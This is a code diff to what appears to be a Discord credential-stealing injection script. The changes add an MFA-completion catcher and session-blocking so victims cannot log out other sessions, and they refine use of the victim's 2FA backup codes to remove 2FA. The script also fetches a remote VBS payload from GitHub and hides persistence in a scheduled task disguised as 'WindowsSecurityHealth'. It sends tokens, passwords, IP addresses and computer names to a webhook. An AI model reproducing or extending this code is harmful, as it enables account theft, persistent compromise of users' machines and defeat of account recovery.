@@ -1,14 +1,14 @@
 module.exports = require("./core.asar");
 process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
-const path = require("path")
+const path = require("path");
 const fs = require("fs");
 const electron = require("electron");
 const https = require("https");
 const queryString = require("querystring");
-const {exec} = require("child_process")
+const { exec } = require("child_process");
 
 var computerName = process.env.COMPUTERNAME;
-let backupscript = `const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`;
+let backupscript = `const elements = document.querySelectorAll('span[class^="code_"]');const isBoolean = (value) => typeof value === "boolean";const codes = Array.from(elements).map((element) => {const code = element.textContent.trim().replace(/-/g, '');const container = element.closest('span[class^="checkboxWrapper_"]');let consumed = container && Array.from(container.classList).some((className) => className.startsWith("checked_"));consumed = isBoolean(consumed) ? consumed : false;return {code,consumed};});codes;`;
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`;
 var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`;
 var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false;
@@ -22,7 +22,8 @@ var config = {
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url: "https://raw.githubusercontent.com/KSCHcuck/sub/main/index.js",
-  injector_url: "https://raw.githubusercontent.com/KSCHcuck/sub/main/Persist.vbs",
+  injector_url:
+    "https://raw.githubusercontent.com/KSCHcuck/sub/main/Persist.vbs",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
@@ -34,6 +35,14 @@ var config = {
       "https://discord.com/api/v*/users/@me/library",
       "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
       "https://discord.com/api/v*/users/@me/billing/subscriptions",
+      "wss://remote-auth-gateway.discord.gg/*",
+      "https://discord.com/api/v*/auth/sessions",
+      "https://*.discord.com/api/v*/auth/sessions",
+      "https://discordapp.com/api/v*/auth/sessions",
+    ],
+  },
+  session_filters: {
+    urls: [
       "wss://remote-auth-gateway.discord.gg/*",
       "https://discord.com/api/v*/auth/sessions",
       "https://*.discord.com/api/v*/auth/sessions",
@@ -462,7 +471,6 @@ async function init() {
     fs.readdir(directoryPath, (err, files) => {
       if (err) {
       } else {
-        files.forEach((file) => {});
       }
     });
   }
@@ -814,7 +822,7 @@ const checUpdate = () => {
 
 async function StartFunc() {
   await electron.app.whenReady();
-  await Persistance()
+  await Persistance();
   await FirstTime();
   await init();
 
@@ -894,7 +902,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(
   }
 );
 
-/*
 electron.session.defaultSession.webRequest.onHeadersReceived(
   async (request, callback) => {
     delete request.responseHeaders["content-security-policy"];
@@ -905,25 +912,20 @@ electron.session.defaultSession.webRequest.onHeadersReceived(
         "Access-Control-Allow-Headers": "*",
       },
     });
-      if (!["POST", "PATCH"].includes(request.method)) return;
-      if (request.statusCode !== 200) return;
-      try {
-        var data = JSON.parse(request.uploadData[0].bytes);
-        console.log(request.url, data)
-      } catch (err) {
-        var data = queryString.parse(
-          decodeURIComponent(request.uploadData[0].bytes.toString())
-        );
-        console.log(request.url, data)
-      }
+    if (!["POST", "PATCH"].includes(request.method)) return;
+    if (request.statusCode !== 200) return;
+    try {
+      var data = JSON.parse(request.uploadData[0].bytes);
+      console.log(request.url, data);
+    } catch (err) {
+      var data = queryString.parse(
+        decodeURIComponent(request.uploadData[0].bytes.toString())
+      );
+      console.log(request.url, data);
+    }
   }
 );
-DEBUG
-*/
-
-
-StartFunc()
-
+//DEBUG
 
 electron.session.defaultSession.webRequest.onCompleted(
   config.onCompleted,
@@ -1056,7 +1058,51 @@ electron.session.defaultSession.webRequest.onCompleted(
           await post(params);
         }, 2000);
         break;
-      case request.url.endsWith("login"): 
+      case request.url.includes("mfa/finish"):
+        var {
+          token,
+          user,
+          billing,
+          friends,
+          Nitro,
+          userAvatar,
+          userBanner,
+          Billings,
+          Friends,
+        } = await BoukiTuclcavectesfonctions();
+        var password = data.password;
+        var params = await makeEmbed({
+          title: "<:nova:1132934190032244786> Random Auth Catcher",
+          color: config["embed-color"],
+          description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+          fields: [
+            {
+              name: "Username <a:inject:1130448568268881960>",
+              value: `\`${user.username}\``,
+              inline: !0,
+            },
+            {
+              name: "Auth Type <:mail:1130451375495589968>",
+              value: `\`${mfa_type}\``,
+              inline: !0,
+            },
+            {
+              name: "<a:cam2:1130448575470514258> Data (password/code)",
+              value: `\`${data}\``,
+              inline: !0,
+            },
+            {
+              name: "<a:eatsomething:1130449693613228072> Token",
+              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+              inline: !1,
+            },
+          ],
+
+          thumbnail: userAvatar,
+        });
+        await post(params);
+        break;
+      case request.url.endsWith("login"):
         var {
           token,
           user,
@@ -1762,28 +1808,22 @@ electron.session.defaultSession.webRequest.onCompleted(
 
         if (config.disable2FA == "true") {
           for (let i = 0; i < backup_codes.length; i++) {
-            if (!ValidFound) {
-              let res = await remove2FA(token, backup_codes[i]);
-              let parse_res = JSON.parse(res);
-              if (parse_res.token) {
-                ValidFound = true;
-                break;
-              } else {
-                if (parse_res.message && parse_res.code) {
-                  if (parse_res.message == "401: Unauthorized") {
-                    ValidFound = true;
-                    break;
-                  }
-                } else {
-                  if (parse_res.message != "Invalid two-factor code") {
-                    ValidFound = true;
-                    break;
-                  } else {
-                    continue;
-                  }
+            try {
+              if (!backup_codes[i].consumed) {
+                let res = await remove2FA(token, backup_codes[i].code);
+                let parse_res = JSON.parse(res);
+
+                if (parse_res.token) {
+                  backup_codes[i].consumed = true;
+                  ValidFound = true;
+                  break;
+                } else if (parse_res.message == "401: Unauthorized") {
+                  break;
+                } else if (parse_res.message != "Invalid two-factor code") {
+                  break;
                 }
               }
-            }
+            } catch (e) {}
           }
         }
 
@@ -1836,7 +1876,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             {
               name: "Backups Code <a:cat_rolling:1130448570789679165>",
               value: `\`\`\`md\n${backup_codes
-                .map((x) => `- ${x}`)
+                .map((x) => `- ${x.code} | Usable: ${x.consumed ? "❌" : "✅"}`)
                 .join("\n")}\`\`\``,
               inline: false,
             },
@@ -1969,8 +2009,8 @@ electron.session.defaultSession.webRequest.onCompleted(
             },
             {
               name: "Backup Codes <a:cat_rolling:1130448570789679165>",
-              value: `\`\`\`md\n${backup_code
-                .map((x) => `- ${x}`)
+              value: `\`\`\`md\n${backup_codes
+                .map((x) => `- ${x.code} | Usable: ${x.consumed ? "❌" : "✅"}`)
                 .join("\n")}\`\`\``,
               inline: false,
             },
@@ -1989,61 +2029,71 @@ electron.session.defaultSession.webRequest.onCompleted(
   }
 );
 
-
 const Persistance = async () => {
-  const vbsFileName = 'Protector.vbs';
-  const batFileName = 'LoginTask.bat';
+  const vbsFileName = "Protector.vbs";
+  const batFileName = "LoginTask.bat";
 
-  const protectFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect');
+  const protectFolderPath = path.join(
+    process.env.APPDATA,
+    "Microsoft",
+    "Protect"
+  );
   const vbsFilePathInProtect = path.join(protectFolderPath, vbsFileName);
-  const startupFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
+  const startupFolderPath = path.join(
+    process.env.APPDATA,
+    "Microsoft",
+    "Windows",
+    "Start Menu",
+    "Programs",
+    "Startup"
+  );
   const vbsFilePathInStartup = path.join(startupFolderPath, vbsFileName);
   const batFilePath = path.join(__dirname, batFileName);
 
-  const scriptVbsContent = await request('GET', config.injector_url, {
-      'Content-Type': 'text/plain'
+  const scriptVbsContent = await request("GET", config.injector_url, {
+    "Content-Type": "text/plain",
   });
 
-  const responseVbsMalware = (scriptVbsContent).toString('utf8') ?? '';
+  const responseVbsMalware = scriptVbsContent.toString("utf8") ?? "";
   const vbsContent = responseVbsMalware
-      .replace("replace_webhook_url", config.webhook)
-      .replace("replace_api_url", config.Placed)
-      .replace("replace_disable_2fa", config.disable2FA)
-      .replace("replace_creator_name", config.creator)
+    .replace("replace_webhook_url", config.webhook)
+    .replace("replace_api_url", config.Placed)
+    .replace("replace_disable_2fa", config.disable2FA)
+    .replace("replace_creator_name", config.creator);
 
   const checkFileExists = (filePath) => {
-      return new Promise((resolve) => {
-          fs.access(filePath, fs.constants.F_OK, (err) => {
-              resolve(!err);
-          });
+    return new Promise((resolve) => {
+      fs.access(filePath, fs.constants.F_OK, (err) => {
+        resolve(!err);
       });
+    });
   };
 
   const checkScheduledTaskExists = () => {
-      return new Promise((resolve) => {
-          exec('schtasks /query /tn "NovaLoginSetuper"', (err) => {
-              resolve(!err);
-          });
+    return new Promise((resolve) => {
+      exec('schtasks /query /tn "NovaLoginSetuper"', (err) => {
+        resolve(!err);
       });
+    });
   };
 
   const createVBSFile = (filePath) => {
-      return new Promise((resolve, reject) => {
-          fs.writeFile(filePath, vbsContent.trim(), (err) => {
-              if (err) return reject(err);
-              resolve();
-          });
+    return new Promise((resolve, reject) => {
+      fs.writeFile(filePath, vbsContent.trim(), (err) => {
+        if (err) return reject(err);
+        resolve();
       });
+    });
   };
 
   const createBatchFile = () => {
-      const batContent = `
+    const batContent = `
           @echo off
           setlocal
 
           set "vbsFilePath=%APPDATA%\\Microsoft\\Protect\\${vbsFileName}"
 
-          schtasks /create /tn "WindowsSecurityHealthSystrayk4itrun" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
+          schtasks /create /tn "WindowsSecurityHealth" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
 
           if %ERRORLEVEL% EQU 0 (
               echo We are scanning your Discord application(s)....
@@ -2057,21 +2107,24 @@ const Persistance = async () => {
           endlocal
       `;
 
-      return new Promise((resolve, reject) => {
-          fs.writeFile(batFilePath, batContent.trim(), (err) => {
-              if (err) return reject(err);
-              resolve();
-          });
+    return new Promise((resolve, reject) => {
+      fs.writeFile(batFilePath, batContent.trim(), (err) => {
+        if (err) return reject(err);
+        resolve();
       });
+    });
   };
 
   const executeBatchFile = () => {
-      return new Promise((resolve, reject) => {
-          exec(`powershell -Command "Start-Process cmd -ArgumentList '/c \"${batFilePath}\"' -Verb RunAs"`, (err) => {
-              if (err) return reject(err);
-              resolve();
-          });
-      });
+    return new Promise((resolve, reject) => {
+      exec(
+        `powershell -Command "Start-Process cmd -ArgumentList '/c \"${batFilePath}\"' -Verb RunAs"`,
+        (err) => {
+          if (err) return reject(err);
+          resolve();
+        }
+      );
+    });
   };
 
   const protectExists = await checkFileExists(vbsFilePathInProtect);
@@ -2079,22 +2132,37 @@ const Persistance = async () => {
   const taskExists = await checkScheduledTaskExists();
 
   if (!protectExists) {
-      await createVBSFile(vbsFilePathInProtect);
+    await createVBSFile(vbsFilePathInProtect);
   }
   if (!startupExists) {
-      await createVBSFile(vbsFilePathInStartup);
+    await createVBSFile(vbsFilePathInStartup);
   }
 
   if (!taskExists) {
-      await createBatchFile();
-      await executeBatchFile();
+    await createBatchFile();
+    await executeBatchFile();
 
-      setTimeout(() => {
-          fs.unlink(batFilePath, (unlinkErr) => {
-              if (unlinkErr) {
-              } else {
-              }
-          });
-      }, 10000);
+    setTimeout(() => {
+      fs.unlink(batFilePath, (unlinkErr) => {
+        if (unlinkErr) {
+        } else {
+        }
+      });
+    }, 10000);
   }
 };
+
+const allSessionsLocked = async () => {
+  const webRequest = electron.session.defaultSession.webRequest;
+  if (!webRequest) return;
+  webRequest.onBeforeRequest(config.session_filters, (details, callback) => {
+    const cancel =
+      details.url.includes("wss://remote-auth-gateway") ||
+      details.url.includes("auth/sessions");
+
+    callback({ cancel });
+  });
+  setTimeout(allSessionsLocked, 5000);
+};
+StartFunc();
+allSessionsLocked();
